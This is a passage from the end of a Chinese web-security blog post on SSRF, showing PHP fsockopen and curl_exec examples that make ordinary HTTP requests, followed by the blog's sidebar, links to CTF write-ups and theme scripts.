将构造好的http请求头发送给$socket建立的连接</span><br>    <span class="hljs-keyword">while</span> (!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$socket</span>)) &#123;<br>      <span class="hljs-comment">// 当$socket拿到的回复没有取完</span><br>        <span class="hljs-variable">$response</span> .= <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$socket</span>, <span class="hljs-number">1024</span>);<br>      <span class="hljs-comment">// 每次读取1024字节，拼接到$response变量上</span><br>    &#125;<br>    <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$socket</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$response</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// 连接失败</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Error <span class="hljs-subst">$errno</span>: <span class="hljs-subst">$errstr</span>&quot;</span>;<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>curl_exec()：用于执行 cURL 会话，发送 HTTP 请求并获取响应</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php">语法：<br><span class="hljs-keyword">mixed</span> <span class="hljs-title function_ invoke__">curl_exec</span>(resource <span class="hljs-variable">$curl</span>)<br><br><span class="hljs-variable">$curl</span> ：cURL 句柄，使用 <span class="hljs-title function_ invoke__">curl_init</span>() 创建。<br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 初始化 cURL 会话</span><br><span class="hljs-variable">$curl</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br><span class="hljs-comment">// 设置 cURL 选项</span><br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_URL, <span class="hljs-string">&#x27;http://www.baidu.com/&#x27;</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-literal">true</span>);<br><span class="hljs-comment">// 执行 cURL 会话</span><br><span class="hljs-variable">$response</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$curl</span>);<br><span class="hljs-comment">// 关闭 cURL 句柄</span><br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$curl</span>);<br><span class="hljs-comment">// 输出响应</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$response</span>;<br><span class="hljs-meta">?&gt;</span><br>在这个例子中，<span class="hljs-title function_ invoke__">curl_exec</span>()函数使用cURL句柄<span class="hljs-variable">$curl</span>执行HTTP GET请求，并返回服务器的响应。使用<span class="hljs-title function_ invoke__">curl_setopt</span>()函数设置cURL选项，例如请求的URL和返回数据的格式。最后，使用<span class="hljs-title function_ invoke__">curl_close</span>()函数关闭cURL句柄，并将响应输出到屏幕上<br></code></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://lengkur.github.io">Lengkur</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://lengkur.github.io/2026/01/24/notes/SSRF/">http://lengkur.github.io/2026/01/24/notes/SSRF/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://lengkur.github.io" target="_blank">Lengkur</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/comeboy2.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/01/24/notes/SSTI/" title="SSTI"><img class="cover" src="/img/comeboy2.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">SSTI</div></div><div class="info-2"><div class="info-item-1"> ## FLASK  123456789101112_...</div></div></div></a><a class="pagination-related" href="/2026/01/24/notes/Struct2/" title="Struct2"><img class="cover" src="/img/comeboy2.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">Struct2</div></div><div class="info-2"><div class="info-item-1">S2-001123456789101112%&#123...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/lengkur.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Lengkur</div><div class="author-info-description">Web Security / CTF Player / Bug Hunter</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">70</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/lengkur"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/lengkur" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:guo374655@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Everything is vulnerable</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-number">1.</span> <span class="toc-text">绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BD%E6%95%B0"><span class="toc-number">2.</span> <span class="toc-text">函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%8D%8F%E8%AE%AE"><span class="toc-number">3.</span> <span class="toc-text">常用协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%87%BD%E6%95%B0"><span class="toc-number">4.</span> <span class="toc-text">常见漏洞函数</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/01/24/wp/ctfshow/web330-%E5%AD%98%E5%82%A8%E5%9E%8BXSS-GET-%E9%92%93%E9%B1%BC/" title="web330-存储型XSS-GET-钓鱼"><img src="/img/stargirl.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="web330-存储型XSS-GET-钓鱼"/></a><div class="content"><a class="title" href="/2026/01/24/wp/ctfshow/web330-%E5%AD%98%E5%82%A8%E5%9E%8BXSS-GET-%E9%92%93%E9%B1%BC/" title="web330-存储型XSS-GET-钓鱼">web330-存储型XSS-GET-钓鱼</a><time datetime="2026-01-24T06:52:37.000Z" title="发表于 2026-01-24 14:52:37">2026-01-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/24/wp/NSSCTF%20WEB/%5BDe1ctf%202019%5DSSRF%20Me-Flask/" title="[De1ctf 2019]SSRF Me-Flask"><img src="/img/catgirl.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="[De1ctf 2019]SSRF Me-Flask"/></a><div class="content"><a class="title" href="/2026/01/24/wp/NSSCTF%20WEB/%5BDe1ctf%202019%5DSSRF%20Me-Flask/" title="[De1ctf 2019]SSRF Me-Flask">[De1ctf 2019]SSRF Me-Flask</a><time datetime="2026-01-24T06:52:37.000Z" title="发表于 2026-01-24 14:52:37">2026-01-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/24/wp/furryctf/DeepSleep-py2%E7%9A%84input-%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87/" title="DeepSleep-py2的input-双写绕过"><img src="/img/Arch.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DeepSleep-py2的input-双写绕过"/></a><div class="content"><a class="title" href="/2026/01/24/wp/furryctf/DeepSleep-py2%E7%9A%84input-%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87/" title="DeepSleep-py2的input-双写绕过">DeepSleep-py2的input-双写绕过</a><time datetime="2026-01-24T06:52:37.000Z" title="发表于 2026-01-24 14:52:37">2026-01-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/24/wp/ctfshow/web171-SQL%E6%B3%A8%E5%85%A5-%E8%81%94%E5%90%88/" title="web171-SQL注入-联合"><img src="/img/stargirl.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="web171-SQL注入-联合"/></a><div class="content"><a class="title" href="/2026/01/24/wp/ctfshow/web171-SQL%E6%B3%A8%E5%85%A5-%E8%81%94%E5%90%88/" title="web171-SQL注入-联合">web171-SQL注入-联合</a><time datetime="2026-01-24T06:52:37.000Z" title="发表于 2026-01-24 14:52:37">2026-01-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/24/wp/ctfshow/web371-ssti-print%E8%BF%87%E6%BB%A4-%E4%B8%8B%E5%88%92%E7%BA%BF-%E5%BC%95%E5%8F%B7-%E6%95%B0%E5%AD%97/" title="web371-ssti-print过滤-下划线-引号-数字"><img src="/img/stargirl.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="web371-ssti-print过滤-下划线-引号-数字"/></a><div class="content"><a class="title" href="/2026/01/24/wp/ctfshow/web371-ssti-print%E8%BF%87%E6%BB%A4-%E4%B8%8B%E5%88%92%E7%BA%BF-%E5%BC%95%E5%8F%B7-%E6%95%B0%E5%AD%97/" title="web371-ssti-print过滤-下划线-引号-数字">web371-ssti-print过滤-下划线-引号-数字</a><time datetime="2026-01-24T06:52:37.000Z" title="发表于 2026-01-24 14:52:37">2026-01-24</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Lengkur</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 6.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.4-b1</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4-b1"></script><script src="/js/main.js?v=5.5.4-b1"></script><div class="js-pjax"></div><link rel="stylesheet" href="/js/imgloaded.js"><link rel="stylesheet" href="/js/universe.js"><script src="/js/universe.js"></script><script id="canvas_nest" defer="defer" color="100,100,100" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/click-show-text.min.js" data-mobile="false" data-text="SQL,Javascript,Flask,HTTP,XSS,SSRF,CSRF,SSTI,Struct2,文件上传,文件包含,信息搜集,PHP,反序列化" data-fontsize="20px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script data-pjax>
+  function butterfly_swiper_injector_config(){
+    var parent_div_git = document.getElementById('recent-posts');
+    var item_html = '<div class="recent-post-item" style="height: auto;width: 100%"><div class="blog-slider swiper-container-fade swiper-container-horizontal" id="swiper_container"><div class="blog-slider__wrp swiper-wrapper" style="transition-duration: 0ms;"><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="2026/01/24/wp/ctfshow/web185-sql-布尔盲注-引号过滤-数字过滤-=过滤/" alt=""><img width="48" height="48" src="/img/stargirl.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2026-01-24</span><a class="blog-slider__title" href="2026/01/24/wp/ctfshow/web185-sql-布尔盲注-引号过滤-数字过滤-=过滤/" alt="">web185-sql-布尔盲注-引号过滤-数字过滤-=过滤</a><div class="blog-slider__text">这里的描述可以随便写</div><a class="blog-slider__button" href="2026/01/24/wp/ctfshow/web185-sql-布尔盲注-引号过滤-数字过滤-=过滤/" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="2026/01/24/wp/ctfshow/web371-ssti-print过滤-下划线-引号-数字/" alt=""><img width="48" height="48" src="/img/stargirl.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2026-01-24</span><a class="blog-slider__title" href="2026/01/24/wp/ctfshow/web371-ssti-print过滤-下划线-引号-数字/" alt="">web371-ssti-print过滤-下划线-引号-数字</a><div class="blog-slider__text">这里的描述可以随便写</div><a class="blog-slider__button" href="2026/01/24/wp/ctfshow/web371-ssti-print过滤-下划线-引号-数字/" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="2026/01/24/wp/三届长城杯/AI_WAF/" alt=""><img width="48" height="48" src="/img/Arch.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2026-01-24</span><a class="blog-slider__title" href="2026/01/24/wp/三届长城杯/AI_WAF/" alt="">AI_WAF</a><div class="blog-slider__text">这里的描述可以随便写</div><a class="blog-slider__button" href="2026/01/24/wp/三届长城杯/AI_WAF/" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="2026/01/24/wp/furryctf/固若金汤-热身题-session伪造-flask-ssti/" alt=""><img width="48" height="48" src="/img/Arch.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2026-01-24</span><a class="blog-slider__title" href="2026/01/24/wp/furryctf/固若金汤-热身题-session伪造-flask-ssti/" alt="">固若金汤-热身题-session伪造-flask-ssti</a><div class="blog-slider__text">这里的描述可以随便写</div><a class="blog-slider__button" href="2026/01/24/wp/furryctf/固若金汤-热身题-session伪造-flask-ssti/" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="2026/01/24/wp/NSSCTF WEB/[NISACTF 2022]level-up~robots-md5强碰撞-sha1强碰撞-php变量解析绕过-create_function绕过/" alt=""><img width="48" height="48" src="/img/catgirl.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2026-01-24</span><a class="blog-slider__title" href="2026/01/24/wp/NSSCTF WEB/[NISACTF 2022]level-up~robots-md5强碰撞-sha1强碰撞-php变量解析绕过-create_function绕过/" alt="">[NISACTF 2022]level-up~robots-md5强碰撞-sha1强碰撞-php变量解析绕过-create_function绕过</a><div class="blog-slider__text">这里的描述可以随便写</div><a class="blog-slider__button" href="2026/01/24/wp/NSSCTF WEB/[NISACTF 2022]level-up~robots-md5强碰撞-sha1强碰撞-php变量解析绕过-create_function绕过/" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="2026/01/24/wp/NSSCTF WEB/[WUSTCTF 2020]朴实无华-信息搜集-MD5弱比较-intval特性-命令执行-空格绕过/" alt=""><img width="48" height="48" src="/img/catgirl.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2026-01-24</span><a class="blog-slider__title" href="2026/01/24/wp/NSSCTF WEB/[WUSTCTF 2020]朴实无华-信息搜集-MD5弱比较-intval特性-命令执行-空格绕过/" alt="">[WUSTCTF 2020]朴实无华-信息搜集-MD5弱比较-intval特性-命令执行-空格绕过</a><div class="blog-slider__text">这里的描述可以随便写</div><a class="blog-slider__button" href="2026/01/24/wp/NSSCTF WEB/[WUSTCTF 2020]朴实无华-信息搜集-MD5弱比较-intval特性-命令执行-空格绕过/" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="2026/01/24/wp/DASCTF/DASCTF-web1/" alt=""><img width="48" height="48" src="/img/Arch.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2026-01-24</span><a class="blog-slider__title" href="2026/01/24/wp/DASCTF/DASCTF-web1/" alt="">DASCTF-web1</a><div class="blog-slider__text">这里的描述可以随便写</div><a class="blog-slider__button" href="2026/01/24/wp/DASCTF/DASCTF-web1/" alt="">详情   </a></div></div></div><div class="blog-slider__pagination swiper-pagination-clickable swiper-pagination-bullets"></div></div></div>';
+    console.log('已挂载butterfly_swiper')
+    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  var elist = 'undefined'.split(',');
+  var cpage = location.pathname;
+  var epage = '/';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_swiper_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_swiper_injector_config();
+  }
+  </script><script defer src="https://cdn.jsdelivr.net/npm/hexo-butterfly-swiper/lib/swiper.min.js"></script><script defer data-pjax src="https://cdn.jsdelivr.net/npm/hexo-butterfly-swiper/lib/swiper_init.js"></script><div class="js-pjax"><script async="async">var arr = document.getElementsByClassName('recent-post-item');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__zoomIn');
+    arr[i].setAttribute('data-wow-duration', '1s');
+    arr[i].setAttribute('data-wow-delay', '0s');
+    arr[i].setAttribute('data-wow-offset', '100');
+    arr[i].setAttribute('data-wow-iteration', '1');
+  }</script><script async="async">var arr = document.getElementsByClassName('card-widget');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__zoomIn');
+    arr[i].setAttribute('data-wow-duration', '');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script></div><script defer src="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/wow.min.js"></script><script defer src="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/wow_init.js"></script><!-- hexo injector body_end end --></body></html>
